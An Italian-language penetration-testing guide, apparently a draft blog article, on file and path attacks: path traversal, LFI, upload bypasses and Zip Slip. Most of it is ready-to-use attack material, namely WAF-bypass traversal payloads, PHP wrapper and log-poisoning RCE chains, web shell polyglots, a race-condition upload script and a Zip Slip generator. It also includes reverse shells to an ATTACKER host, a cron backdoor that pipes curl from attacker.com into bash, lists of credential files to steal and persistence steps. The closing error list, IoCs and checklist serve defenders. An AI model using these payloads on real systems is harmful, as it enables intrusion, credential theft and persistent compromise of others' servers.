---
title: 'File & Path Attacks: LFI, Upload e Path Traversal'
slug: file-path-attacks-guida-completa
description: 'Guida ai file & path attacks nel pentesting web: path traversal, LFI, file upload, web shell, Zip Slip, backup exposure e file read.'
image: /file-path-attacks-guida-completa.webp
draft: true
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - web shell
  - web fuzzing
---

***

Un'applicazione web è un programma che gira su un server, e quel server ha un filesystem. Ogni volta che l'applicazione legge un file, lo include, lo serve in download, ne estrae un archivio, o permette a un utente di caricarne uno, c'è una superficie di attacco. I **File & Path Attacks** sfruttano questa superficie per fare tre cose: **leggere file che non dovresti leggere** (credenziali, chiavi SSH, token cloud), **caricare file che non dovresti caricare** (web shell → RCE), e **eseguire file che non dovresti eseguire** (LFI + poisoning → RCE).

Questa classe di vulnerabilità la trovo nel **45% dei pentest web** se considero tutte le varianti: [Path Traversal](https://hackita.it/articoli/path-traversal) nel 20%, [File Upload non sicuro](https://hackita.it/articoli/file-upload-attack) nel 15%, [LFI](https://hackita.it/articoli/lfi) nel 12%, [backup esposti](https://hackita.it/articoli/backup-exposure) nel 10%, [source code disclosure](https://hackita.it/articoli/source-code-disclosure) nell'8%. Sono numeri alti — e il motivo è che i file sono il cuore di ogni applicazione: template, configurazioni, upload utente, log, sessioni. Ogni punto di contatto è un potenziale vettore.

Un caso che racconta bene il tema: fintech SaaS, API di download documenti. Il parametro `?file=terms.pdf` era vulnerabile a Path Traversal. `?file=../../../proc/self/environ` → la risposta conteneva `AWS_ACCESS_KEY_ID=AKIA...` e `AWS_SECRET_ACCESS_KEY=...` in chiaro. Con quelle credenziali: `aws s3 ls` → 47 bucket → 200.000 transazioni finanziarie. **Da un parametro URL a un data breach in 5 minuti.** Nessun exploit sofisticato, nessun zero-day — solo un `../` in un parametro che nessuno aveva validato.

## Cos'è un File & Path Attack?

Un File & Path Attack è una classe di vulnerabilità web in cui l'attaccante sfrutta la gestione dei file da parte dell'applicazione per **accedere a file al di fuori della directory prevista** (Path Traversal, LFI), **includere ed eseguire file remoti o locali** (RFI, LFI), **caricare file malevoli** (File Upload → Web Shell), **leggere file arbitrari** (Arbitrary File Read), **scrivere file via estrazione archivi** (Zip Slip), o **accedere a file sensibili dimenticati** (Backup Exposure, Source Code Disclosure). L'impatto va dalla lettura di credenziali alla Remote Code Execution diretta.

> **I File & Path Attacks sono pericolosi?**
> Sì — coprono l'intero spettro di impatto. **Path Traversal** → lettura credenziali cloud, chiavi SSH, configurazioni → accesso completo all'infrastruttura. **LFI + Log Poisoning** → RCE senza upload. **File Upload** → web shell → shell persistente. **Zip Slip** → scrittura file arbitrari → RCE o persistence. Trovati nel **45% dei pentest web** considerando tutte le varianti. Il 70% delle LFI è escalabile a RCE.

## Come Verificare — Reconnaissance e Discovery

### Shodan e Google Dorks

```bash
# Shodan — errori di path esposti
"No such file or directory" "include" port:80,443
"failed to open stream" port:80,443
"java.io.FileNotFoundException" port:80,443
"Warning: include(" port:80,443

# Google Dorks — file esposti
site:target.com ext:sql OR ext:bak OR ext:old OR ext:zip
site:target.com ext:env OR ext:yml OR ext:conf
site:target.com inurl:".env" OR inurl:"config" OR inurl:"backup"
intitle:"index of" site:target.com
site:target.com ext:log
site:target.com filetype:sql "INSERT INTO"
```

### Feroxbuster — Discovery di Backup e File Sensibili

```bash
# Scan completo con estensioni backup e config
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,bak,old,sql,sql.gz,zip,tar.gz,env,conf,yml,log,swp,orig \
  --status-codes 200,301,302 \
  -t 50

# Wordlist specifica per backup
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt

# Wordlist per .git e source code
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  --filter-status 404 \
  --dont-filter 200
```

### Nuclei — Template Specifici

```bash
# Scan completo file & path
nuclei -u https://target.com -tags lfi,rfi,traversal,upload,exposure

# Template specifici
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t vulnerabilities/generic/generic-lfi.yaml
nuclei -u https://target.com -t exposures/configs/
nuclei -u https://target.com -t exposures/backups/
nuclei -u https://target.com -t exposures/files/
nuclei -u https://target.com -t misconfiguration/git-config.yaml
```

***

## Path Traversal — Bypass Encoding e WAF Evasion

Il [Path Traversal](https://hackita.it/articoli/path-traversal) è il fondamento: la sequenza `../` permette di uscire dalla directory dell'applicazione e leggere qualsiasi file. Ma ogni WAF e filtro decente blocca `../`. Il vero skill del pentester sta nel **bypass**.

### Payload Base

```bash
# Test iniziale — prova tutti questi, in ordine
?file=../../../etc/passwd
?file=/etc/passwd                           # Path assoluto
?file=....//....//....//etc/passwd          # Bypass strip singola di ../
?file=..%2f..%2f..%2fetc/passwd             # URL encode di /
?file=..%252f..%252f..%252fetc/passwd       # Double URL encode
?file=%2e%2e%2f%2e%2e%2fetc/passwd          # URL encode di . e /
?file=..%c0%af..%c0%afetc/passwd            # UTF-8 overlong di /
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd      # Unicode fullwidth /
?file=..%e0%80%af..%e0%80%afetc/passwd      # UTF-8 overlong 3-byte
?file=..%00/..%00/etc/passwd                # Null byte in path
?file=....\/....\/....\/etc/passwd          # Mixed separators
?file=..%5c..%5c..%5cetc/passwd             # Backslash encoded (Windows)
```

### WAF Bypass — Encoding Combinati

I WAF moderni (Cloudflare, Akamai, ModSecurity) bloccano i pattern noti. Le combinazioni di encoding li bypassano:

```bash
# Double encoding — il WAF decodifica una volta, l'app decodifica una seconda
..%252f..%252f..%252f → WAF vede %2f (benigno) → App decodifica a ../../../

# Triple encoding (raro ma funziona su stack con proxy multipli)
..%25252f..%25252f..%25252f

# Mixed case + encoding (Windows IIS)
..%5C..%5C..%5Cwindows%5Cwin.ini
..%255c..%255c

# Unicode normalization bypass
..%c1%1c..%c1%1c    # Overlong UTF-8 per /
..%c0%2e%c0%2e%c0%af  # Overlong per ../

# Bypass con path canonicalization
/var/www/html/../../../etc/passwd
/images/../../../etc/passwd
./../../../../etc/passwd

# Bypass con encoding di punti
%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5c (Windows)
```

### WAF Bypass — Tecniche Strutturali

```bash
# Null byte truncation (PHP < 5.3.4, Java in alcuni casi)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Parameter pollution — lo stesso parametro due volte
?file=safe.pdf&file=../../../etc/passwd
# Alcuni parser prendono il secondo valore

# JSON body (bypassa WAF su GET params)
POST /api/download
{"file": "../../../etc/passwd"}

# Header injection (se il file è letto da un header)
X-File-Path: ../../../etc/passwd

# Array notation
?file[]=../../../etc/passwd

# Path shorthand Windows
?file=..\..\..\..\etc\passwd
?file=....\\....\\etc\\passwd
```

### Output Reale — Cosa Vedi Quando Funziona

```
# Request:
GET /download?file=....//....//....//etc/passwd HTTP/1.1

# Response (200 OK):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
```

Se vedi questo output → Path Traversal confermato. Nota il `www-data` (utente del web server) e `mysql` (conferma che c'è un database locale).

### File Target di Alto Valore — La Lista Completa

```bash
# === CREDENZIALI APPLICATIVE ===
/var/www/html/.env                           # Laravel/Node — DB_PASSWORD, APP_KEY, API keys
/var/www/html/config.php                     # PHP config con credenziali DB
/var/www/html/wp-config.php                  # WordPress — DB, AUTH_KEY, SALT
/app/config/database.yml                     # Rails
/app/settings.py                             # Django — SECRET_KEY, DATABASES
/app/application.properties                  # Spring Boot — datasource.password
/app/appsettings.json                        # .NET Core

# === CREDENZIALI CLOUD ===
/home/USER/.aws/credentials                  # AWS access key + secret
/proc/self/environ                           # AWS creds in ECS/Lambda/EKS
/home/USER/.azure/accessTokens.json          # Azure tokens
/home/USER/.config/gcloud/application_default_credentials.json  # GCP

# === SSH & ACCESSO REMOTO ===
/home/USER/.ssh/id_rsa                       # Chiave SSH privata → accesso diretto
/home/USER/.ssh/id_ed25519
/root/.ssh/id_rsa
/home/USER/.ssh/known_hosts                  # Mappa della rete

# === KUBERNETES & CONTAINER ===
/var/run/secrets/kubernetes.io/serviceaccount/token  # K8s SA token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/.dockerenv                                  # Conferma Docker
/proc/1/cgroup                               # Conferma container

# === SISTEMA ===
/etc/passwd                                  # Utenti (primo test sempre)
/etc/shadow                                  # Hash password (serve root)
/etc/hosts                                   # Mappa rete interna
/proc/self/cmdline                           # Come è stato avviato il processo
/proc/net/tcp                                # Connessioni attive (hex)
/proc/net/arp                                # ARP → host nella LAN

# === HISTORY (password in chiaro!) ===
/home/USER/.bash_history
/root/.bash_history
/home/USER/.mysql_history
```

***

## LFI — Da File Read a RCE Con PHP Wrappers e Poisoning

La [LFI (Local File Inclusion)](https://hackita.it/articoli/lfi) è Path Traversal + **esecuzione**. In PHP, `include()` e `require()` non solo leggono — interpretano il contenuto come codice. La domanda non è "posso leggere file?" ma "posso far eseguire codice al server?". Nel **70% dei casi** la risposta è sì.

### PHP Wrappers — Il Coltellino Svizzero

I PHP wrappers sono protocolli built-in che trasformano la LFI in uno strumento potentissimo:

#### php\://filter — Leggi Source Code in Chiaro

Il wrapper più utile: legge un file PHP **senza eseguirlo**, restituendolo codificato:

```bash
# Base64 encode — il più affidabile
?page=php://filter/convert.base64-encode/resource=config.php

# Output:
# PD9waHAKJGRiX2hvc3QgPSAnbG9jYWxob3N0JzsKJGRiX3VzZXIgPSAnYWRtaW4nOwokZGJfcGFz
# cyA9ICdTdXBlclNlY3JldDEyMyEnOwo/Pg==

# Decodifica:
echo "PD9waHAK..." | base64 -d
# <?php
# $db_host = 'localhost';
# $db_user = 'admin';
# $db_pass = 'SuperSecret123!';
# ?>

# Rot13
?page=php://filter/read=string.rot13/resource=config.php

# Conversione charset (bypass WAF che filtra "base64")
?page=php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php

# Chain di filtri multipli
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
```

#### PHP Filter Chain — La Tecnica 2024-2026 per RCE Senza Upload

La **PHP filter chain** è una tecnica avanzata scoperta nel 2022-2023 che permette di ottenere **RCE pura dalla sola LFI** — senza log poisoning, senza upload, senza `allow_url_include`. Funziona concatenando decine di filtri `convert.iconv` per "costruire" caratteri PHP arbitrari dal contenuto di un file locale:

```bash
# Genera la chain con php_filter_chain_generator.py
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'

# Output (centinaia di filtri concatenati):
?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|...[molti altri]...|convert.base64-decode/resource=php://temp

# → Il server esegue <?php system("id"); ?> → RCE!
# Funziona su QUALSIASI LFI PHP, senza alcun prerequisito
```

**Questa è la tecnica più potente del 2026 per LFI → RCE.** Non richiede nulla se non una LFI funzionante su PHP ≥ 7.0. Il tool `php_filter_chain_generator.py` è su GitHub.

#### php\://input — RCE dal Body della Request

Richiede `allow_url_include=On` (raro, ma presente nel 5% dei server legacy):

```bash
POST /?page=php://input HTTP/1.1
Content-Type: text/plain

<?php system('id'); ?>

# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### data:// — RCE Inline

Richiede `allow_url_include=On`:

```bash
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Base64 di: <?php system('id'); ?>
# → uid=33(www-data)

# Bypass WAF che filtra "data://"
?page=Data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
?page=data://text/plain,<?php+system('id');+?>
```

#### expect:// — RCE Diretta

Richiede estensione PHP `expect` (rara):

```bash
?page=expect://id
?page=expect://bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

### LFI → RCE via Log Poisoning — Step by Step Con Output

Il percorso più affidabile quando i wrappers avanzati non funzionano:

```bash
# === STEP 1: Verifica di poter leggere i log ===
?page=../../../var/log/apache2/access.log

# Output (se funziona, vedi righe di log):
# 192.168.1.100 - - [19/Feb/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."

# File di log da provare (in ordine di probabilità):
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log       # CentOS/RHEL
/var/log/httpd/error_log
/opt/lampp/logs/access_log      # XAMPP
/var/log/auth.log               # SSH login attempts
/var/log/mail.log               # SMTP
/var/log/vsftpd.log             # FTP

# === STEP 2: Inietta PHP nel log tramite User-Agent ===
curl http://target.com/ -H "User-Agent: <?php system(\$_GET['c']); ?>"

# Ora il log contiene:
# 192.168.1.100 - - [...] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['c']); ?>"

# === STEP 3: Includi il log con il parametro di comando ===
curl "http://target.com/page.php?page=../../../var/log/apache2/access.log&c=id"

# Output:
# ...righe di log...
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# ...altre righe di log...

# === STEP 4: Reverse shell ===
curl "http://target.com/page.php?page=../../../var/log/apache2/access.log&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

### LFI → RCE via Session Poisoning

```bash
# === STEP 1: Trova il path delle sessioni PHP ===
# Default: /tmp/sess_PHPSESSID o /var/lib/php/sessions/sess_PHPSESSID

# === STEP 2: Inietta PHP nella sessione ===
# Trova una pagina che salva input utente in $_SESSION
# Es: ?lang=<?php system($_GET['c']); ?>
# O via cookie: Cookie: PHPSESSID=test; preferenze=<?php system($_GET['c']); ?>

# === STEP 3: Includi il file di sessione ===
?page=../../../tmp/sess_YOUR_PHPSESSID&c=id
# Il session file contiene il PHP iniettato → viene eseguito
```

### LFI → RCE via /proc/self/environ

```bash
# Step 1: Imposta User-Agent con PHP
# Step 2: Includi /proc/self/environ
curl "http://target.com/page.php?page=/proc/self/environ" \
  -H "User-Agent: <?php system(\$_GET['c']); ?>"

# /proc/self/environ contiene HTTP_USER_AGENT con il tuo PHP → RCE
```

### LFI WAF Bypass

```bash
# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

# Double encoding
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Path truncation (PHP < 5.3, crea path > 4096 chars)
?page=../../../etc/passwd/./././././././.[...ripeti fino a 4096 chars]

# Wrapper bypass — se "php://" è filtrato
?page=Php://filter/convert.base64-encode/resource=config.php
?page=pHp://filter/convert.base64-encode/resource=config.php

# Filter bypass — se "base64" è filtrato
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
?page=php://filter/zlib.deflate/resource=config.php
```

***

## File Upload — Bypass Content-Type, Magic Bytes e Polyglot

Il [File Upload Attack](https://hackita.it/articoli/file-upload-attack) sfrutta le funzionalità di upload per caricare una [web shell](https://hackita.it/articoli/web-shell). Ogni bypass ha il suo contesto — lo sviluppatore può aver implementato uno, due, o tutti i controlli. Il pentester deve testarli tutti.

### Bypass Estensione — La Lista Completa

```bash
# Double extension
shell.php.jpg            # Apache può interpretare .php
shell.php.png
shell.php.gif

# Estensioni alternative PHP
shell.php5    shell.phtml    shell.phar    shell.phps
shell.pht     shell.pgif     shell.shtml   shell.inc

# Case variation
shell.pHp    shell.PHP    shell.Php    shell.pHP

# Null byte (PHP < 5.3.4)
shell.php%00.jpg         # L'app vede .jpg, PHP vede .php

# Trailing characters
shell.php.               # Trailing dot (Windows lo rimuove)
shell.php%20             # Trailing space
shell.php::$DATA         # NTFS Alternate Data Stream (Windows)
shell.php%0a             # Newline

# Semicolon (IIS)
shell.asp;.jpg

# .htaccess overwrite (carica .htaccess + shell.jpg)
```

### Bypass Content-Type

```bash
# In Burp Suite, modifica il Content-Type della multipart:
# Original:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Bypass:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

# Content-Type validi per bypass:
image/jpeg
image/png
image/gif
image/svg+xml
application/pdf
application/octet-stream
```

### Bypass Magic Bytes — Polyglot Files

Un file polyglot è **valido come immagine E come PHP** contemporaneamente:

```bash
# GIF + PHP (il più affidabile)
GIF89a<?php system($_GET['c']); ?>
# → Passa il controllo magic bytes (GIF89a) E il PHP viene eseguito

# JPEG + PHP
printf '\xFF\xD8\xFF\xE0' > shell.php.jpg
echo '<?php system($_GET["c"]); ?>' >> shell.php.jpg

# PNG + PHP
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php.png
echo '<?php system($_GET["c"]); ?>' >> shell.php.png

# Polyglot reale con exiftool (inietta PHP nei metadata EXIF)
exiftool -Comment='<?php system($_GET["c"]); ?>' legit_image.jpg
mv legit_image.jpg shell.php.jpg
# L'immagine è valida, si apre correttamente, E contiene PHP nel commento EXIF
```

### .htaccess Overwrite — RCE Tramite Qualsiasi Estensione

Se puoi caricare un file `.htaccess` nella directory di upload:

```bash
# Carica .htaccess con contenuto:
AddType application/x-httpd-php .jpg

# Ora QUALSIASI file .jpg nella directory viene eseguito come PHP
# Carica shell.jpg → visitalo → RCE

# Alternativa: handler specifico
<Files "shell.jpg">
  SetHandler application/x-httpd-php
</Files>
```

### Race Condition Upload

L'applicazione carica → valida → cancella se non valido. Ma c'è una finestra temporale:

```python
# race_upload.py — richieste parallele
import threading, requests

URL = "https://target.com"
UPLOAD_URL = f"{URL}/upload"
SHELL_URL = f"{URL}/uploads/shell.php?c=id"

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
        requests.post(UPLOAD_URL, files=files)

def trigger():
    while True:
        r = requests.get(SHELL_URL)
        if "uid=" in r.text:
            print(f"[+] RCE! Output: {r.text}")
            return

for _ in range(10): threading.Thread(target=upload).start()
for _ in range(5): threading.Thread(target=trigger).start()
```

### Nginx + PHP-FPM Path Confusion

Configurazione Nginx/PHP-FPM con `cgi.fix_pathinfo=1` (default!):

```bash
# Carica immagine legittima con PHP nel commento EXIF
# L'immagine si chiama avatar.jpg ed è nella directory /uploads/

# Accedi a:
/uploads/avatar.jpg/.php

# Nginx vede .php → passa a PHP-FPM
# PHP-FPM con fix_pathinfo=1 cerca .php, non lo trova
# → risale al file esistente (avatar.jpg) → lo esegue come PHP
# → Il PHP nel commento EXIF viene eseguito → RCE
```

***

## Zip Slip — Scrivere File Ovunque Via Archivi

Il [Zip Slip](https://hackita.it/articoli/zip-slip) sfrutta le sequenze `../` nei nomi dei file all'interno di archivi ZIP/TAR/JAR. Quando l'applicazione estrae l'archivio senza validare i path, i file vengono scritti al di fuori della directory di destinazione.

```python
# === Crea payload Zip Slip ===
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    # Web shell nella document root
    z.writestr('../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
    
    # Sovrascrittura authorized_keys per SSH access
    z.writestr('../../../root/.ssh/authorized_keys', 'ssh-rsa AAAA... attacker@kali')
    
    # Backdoor cron job
    z.writestr('../../../etc/cron.d/backdoor', '* * * * * root curl http://attacker.com/shell.sh | bash')

# === Symlink attack via TAR (ancora più potente) ===
import tarfile, io

tar = tarfile.open('evil.tar.gz', 'w:gz')
# Crea un symlink che punta alla document root
info = tarfile.TarInfo(name='uploads')
info.type = tarfile.SYMTYPE
info.linkname = '/var/www/html'
tar.addfile(info)
# Ora aggiungi un file che segue il symlink
data = b'<?php system($_GET["c"]); ?>'
info2 = tarfile.TarInfo(name='uploads/shell.php')
info2.size = len(data)
tar.addfile(info2, io.BytesIO(data))
tar.close()
# Estrazione: il symlink punta a /var/www/html → shell.php finisce lì
```

***

## Tool Workflow Reali — Come Li Uso in un Pentest

### ffuf — Fuzzing Parametri per Path Traversal e LFI

```bash
# Fuzz il valore del parametro file con payload traversal
ffuf -u "https://target.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0

# Fuzz per trovare il parametro vulnerabile
ffuf -u "https://target.com/page?FUZZ=../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -mr "root:x:"

# Fuzz wrappers LFI
ffuf -u "https://target.com/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-php-wrappers.txt \
  -mc 200 -fs 0

# Fuzz directory upload per web shell
ffuf -u "https://target.com/uploads/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,php5,phtml,phar,jsp,asp,aspx \
  -mc 200
```

### Burp Suite — Workflow Completo

```
1. Spider/Crawl → identifica tutti i parametri che referenziano file
   Target: page=, file=, path=, template=, lang=, include=, doc=, img=

2. Intruder → per ogni parametro:
   a. Payload list: LFI-Jhaddix.txt
   b. Grep match: "root:x:" (Linux), "[fonts]" (Windows win.ini)
   c. Se match → Path Traversal confermato

3. Per LFI → Intruder con PHP wrappers:
   php://filter/convert.base64-encode/resource=FUZZ
   Con FUZZ = config, database, settings, .env, wp-config

4. Per Upload → Intruder su estensione:
   Posizioni: filename="shell.FUZZ"
   Payload: php, php5, phtml, phar, pHp, php.jpg, php%00.jpg

5. Repeater → exploit manuale con payload finali
```

### git-dumper — Repository Git Esposti

```bash
# Verifica se .git è esposto
curl -s https://target.com/.git/HEAD
# Se risponde "ref: refs/heads/main" → esposto!

# Dump completo del repository
git-dumper https://target.com/.git/ ./target-source
cd target-source

# Cerca credenziali nella storia dei commit
git log --all --oneline
git log --all -p -- "*.env" "*.yml" "*config*" "*secret*"
trufflehog filesystem --directory=.
```

***

## Detection & Evasion — WAF Bypass Avanzato

### ModSecurity CRS Bypass per Path Traversal

```bash
# CRS Rule 930110 blocca ../ e varianti
# Bypass con overlong UTF-8
..%c0%af..%c0%afetc/passwd

# Bypass con Unicode normalization
..%e0%80%af..%e0%80%afetc/passwd

# Bypass con case mixing su Windows
..\..\..\WINDOWS\win.ini
..\..\..\WiNdOwS\WiN.InI
```

### Cloudflare WAF Bypass

```bash
# Double encoding è il più efficace contro Cloudflare
..%252f..%252f..%252fetc%252fpasswd

# Tab e newline nei path
..%09/..%09/etc/passwd
..%0a/..%0a/etc/passwd

# Unicode tricks
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### WAF Bypass per Upload

```bash
# Content-Disposition manipulation
Content-Disposition: form-data; name="file"; filename="shell.php"
→ Content-Disposition: form-data; name="file"; filename="shell.pHp"
→ Content-Disposition: form-data; name="file"; filename ="shell.php"  # space prima di =
→ Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php

# Boundary manipulation
# Modifica il boundary della multipart request per confondere il WAF

# Chunked Transfer Encoding
# Spezza il payload in chunk piccoli → il WAF non ricostruisce
```

***

## 🏢 Enterprise Escalation — Da File Read al Dominio

Ogni variante file & path ha il suo percorso di escalation enterprise:

### Path Traversal / File Read → Cloud Compromise

```
File Read → /proc/self/environ → AWS_ACCESS_KEY_ID + SECRET
→ aws sts get-caller-identity → conferma accesso
→ aws s3 ls → enumera bucket
→ aws secretsmanager list-secrets → credenziali database
→ aws ec2 describe-instances → mappa infrastruttura
→ Compromissione completa dell'ambiente cloud
```

**Tempo reale:** 5-15 minuti.

### LFI + Log Poisoning → AD Compromise

```
LFI → RCE via log poisoning → shell www-data
→ config files con credenziali DB e LDAP
→ LDAP bind → enumera Active Directory
→ Password in description di service account
→ Domain Admin
```

**Tempo reale:** 30-90 minuti.

### File Upload → Persistence

```
File Upload → Web Shell → Shell
→ Copia shell in 5 location nascoste (.thumbs.php, .cache.php)
→ Aggiungi reverse shell al crontab
→ Inietta backdoor in file esistente (index.php)
→ Persistence anche dopo patch della vulnerabilità di upload
```

### Source Code Disclosure → Supply Chain

```
.git esposto → dump codice → credenziali hardcoded
→ API key Stripe/Twilio/SendGrid → financial impact
→ O: credenziali CI/CD (GitLab token) → pipeline injection → supply chain
```

## 🔌 Variante API / Microservizi 2026

```json
// Path Traversal in API di download documenti
GET /api/v2/documents/download?path=../../../proc/self/environ

// LFI in API di template rendering
POST /api/v2/reports/generate
{"template": "php://filter/convert.base64-encode/resource=../config/database"}

// File Upload in API di import dati
POST /api/v2/import/csv
Content-Type: multipart/form-data
filename: shell.php (Content-Type: text/csv)

// Zip Slip in API di bulk import
POST /api/v2/data/bulk-import
Content-Type: application/zip
body: evil.zip con ../../../var/www/html/shell.php

// Source Code via API debug endpoint
GET /api/v2/debug/source?file=../../../app/settings.py
```

***

## Micro Playbook Reale

**Minuto 0-5 → Discovery**

```bash
feroxbuster -u https://target.com -w common.txt -x bak,old,sql,env,zip,git
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.env
```

**Minuto 5-15 → Path Traversal su ogni parametro file**

```bash
# Su ogni parametro che referenzia file:
ffuf -u "https://target.com/download?file=FUZZ" \
  -w LFI-Jhaddix.txt -mc 200 -mr "root:x:"
```

**Minuto 15-25 → LFI con wrappers**

```bash
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=../config/database
# → decodifica → credenziali
```

**Minuto 25-35 → LFI → RCE**

```bash
# php_filter_chain_generator.py per RCE senza prerequisiti
# O: log poisoning se i log sono leggibili
```

**Minuto 35-45 → File Upload bypass**

```bash
# Testa: double extension, Content-Type, magic bytes, .htaccess
# Polyglot con exiftool se serve
```

**Minuto 45+ → Enterprise escalation**

```bash
# Da /proc/self/environ → cloud creds → aws s3 ls
# Da config files → DB dump → LDAP creds → AD
```

***

## Caso Studio Concreto

**Settore:** E-commerce fashion, 150.000 clienti, infrastruttura AWS.
**Scope:** Black-box.

Feroxbuster ha trovato `/.git/HEAD` → `ref: refs/heads/production`. `git-dumper` ha ricostruito l'intero codice sorgente in 3 minuti. Nel codice: `config/database.yml` con credenziali RDS MySQL, `.env` con API key Stripe live (non test), e token GitLab CI.

Separatamente, il form di upload avatar accettava file PHP — il filtro era solo JavaScript nel frontend. Con Burp ho rimosso la validazione client → caricato `shell.php.jpg` → Apache lo eseguiva (mod\_php con `AddHandler php5-script .php`) → RCE.

Dal source code Git: le credenziali Stripe erano production → possibilità di emettere rimborsi fraudolenti. Il token GitLab CI dava accesso alla pipeline → possibilità di iniettare codice nel deploy → supply chain attack su tutta la piattaforma.

**Tempo:**

* Da .git a credenziali Stripe: **15 minuti**
* Da upload a web shell: **8 minuti**
* Da web shell a database 150K clienti: **25 minuti**
* Impatto totale: dati clienti + API Stripe + pipeline CI/CD

***

## Errori Comuni Reali Trovati nei Pentest

**1. Path concatenation senza canonicalization (20%)**
`open(f"/var/www/files/{input}")` — l'input contiene `../` e il path esce dalla directory.

**2. Filtro upload solo client-side (15%)**
JavaScript valida l'estensione nel browser. L'attaccante usa Burp/curl e bypassa tutto.

**3. .git nella document root (8%)**
Il deploy usa `git pull` e `.git/` resta accessibile. Codice sorgente e storico commit esposti.

**4. `include($user_input)` senza whitelist (12%)**
L'applicazione PHP include file basandosi su un parametro GET senza validare.

**5. Backup nella document root (10%)**
`mysqldump > /var/www/html/backup.sql`. Credenziali e dati accessibili da chiunque.

**6. `.env` accessibile (10%)**
Il file `.env` non è escluso dalla document root. Contiene DATABASE\_URL, SECRET\_KEY, API\_KEY.

**7. Upload directory con esecuzione PHP (15%)**
`/uploads/` senza `php_flag engine off` → qualsiasi PHP caricato viene eseguito.

***

## Indicatori di Compromissione (IoC)

**Path Traversal / LFI:**

* Request con `../`, `..%2f`, `%252e%252e` nei parametri URL
* Accesso a file di sistema (`/etc/passwd`, `.env`, `config.php`) nei log
* `php://filter` o `php://input` nei parametri URL
* Response con contenuto di file di sistema (hash, configurazioni)

**File Upload:**

* File con estensioni eseguibili in directory di upload (`.php` dove dovrebbero esserci solo immagini)
* File con dimensione anomala (web shell di 23 bytes vs immagini di KB/MB)
* File con timestamp diverso dal deploy dell'applicazione
* Request GET/POST con parametri di comando verso file in `/uploads/`

**Zip Slip:**

* File estratti al di fuori della directory prevista
* Nomi file nell'archivio contenenti `../`
* Symlink creati durante l'estrazione

**Backup / Source:**

* Access log con richieste a `.sql`, `.bak`, `.zip`, `.env`, `.git/`
* Download di file grandi da URL non previsti (backup dump)

***

## ✅ Checklist Finale — File & Path Testing

```
PATH TRAVERSAL
☐ Testati tutti i parametri che referenziano file (file=, path=, page=, doc=, template=, lang=)
☐ Testato ../ base
☐ Testato ....//....// (bypass strip)
☐ Testato ..%2f (URL encode)
☐ Testato ..%252f (double encode)
☐ Testato %2e%2e%2f (encode punti)
☐ Testato ..%c0%af (UTF-8 overlong)
☐ Testato path assoluto /etc/passwd
☐ Testato null byte %00 (PHP < 5.3.4)
☐ Testato su Windows ..\ e ..%5c

LFI (PHP)
☐ php://filter/convert.base64-encode/resource=config
☐ php://filter con iconv (bypass filtro base64)
☐ php_filter_chain_generator.py per RCE diretta
☐ php://input (se allow_url_include=On)
☐ data:// (se allow_url_include=On)
☐ expect:// (se estensione presente)
☐ Log poisoning: access.log, error.log, auth.log
☐ Session poisoning via /tmp/sess_ID
☐ /proc/self/environ con User-Agent PHP
☐ Testato null byte truncation

FILE UPLOAD
☐ Double extension (.php.jpg)
☐ Extension alternative (.php5, .phtml, .phar)
☐ Case variation (.pHp)
☐ Null byte (.php%00.jpg)
☐ Content-Type spoofing (image/jpeg)
☐ Magic bytes (GIF89a, PNG header, JPEG header)
☐ Polyglot con exiftool
☐ .htaccess upload
☐ Race condition
☐ Nginx path confusion (.jpg/.php)
